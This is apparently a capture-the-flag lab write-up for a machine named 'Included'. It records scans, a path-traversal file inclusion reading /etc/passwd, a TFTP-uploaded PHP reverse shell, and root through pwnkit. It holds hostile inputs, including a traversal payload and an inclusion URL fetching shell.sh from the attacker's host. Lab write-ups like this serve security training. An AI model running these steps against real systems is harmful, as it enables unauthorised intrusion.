# Included

IPv4: 10.129.95.185

## Enumeration/Scanning

- sudo nmap -sV -sC -Pn 10.129.95.185
    
    Starting Nmap 7.93 ( [https://nmap.org](https://nmap.org/) ) at 2023-08-07 05:29 EDT
    Nmap scan report for 10.129.95.185
    Host is up (0.059s latency).
    Not shown: 999 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    | http-title: Site doesn't have a title (text/html; charset=UTF-8).
    |_Requested resource was http://10.129.95.185/?file=home.php
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 9.82 seconds
    

- sudo gobuster dir -u [http://10.129.95.185](http://10.129.95.185/) -w /usr/share/wordlists/dirb/common.txt
    
    /.htaccess            (Status: 403) [Size: 278]
    /.htpasswd            (Status: 403) [Size: 278]
    /.hta                 (Status: 403) [Size: 278]
    /fonts                (Status: 301) [Size: 314] [--> http://10.129.95.185/fonts/]
    /images               (Status: 301) [Size: 315] [--> http://10.129.95.185/images/]
    /index.php            (Status: 301) [Size: 308] [--> http://10.129.95.185/]
    /server-status        (Status: 403) [Size: 278]
    

Immediately found a REMOTE FILE INCLUSION vulnerability

http://10.129.95.185/?file=../../../etc/passwd

## Exploitation

[http://10.129.95.185/?file=](http://10.129.95.185/?file=../../../etc/passwd)http://10.10.16.173/shell.sh did not work as its not grabbing my file from my python web server

I BROKE THE HOST HAHA restarting…

Double checking the passwd file, I noticed there is tftp. Check google search it uses port 69

tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot

I was able to access it but it is not ran.

http://10.129.234.198/?file=../../../var/lib/tftpboot/shell.sh

Since the server is running php I will attempt a php reverse shell

IT WORKED!

## Privilege Escalation

Checking SUID binaries and running linpeas I noticed I may be able to run pwnkit

pwnkit worked

rooted!

## Post-exploitation

None
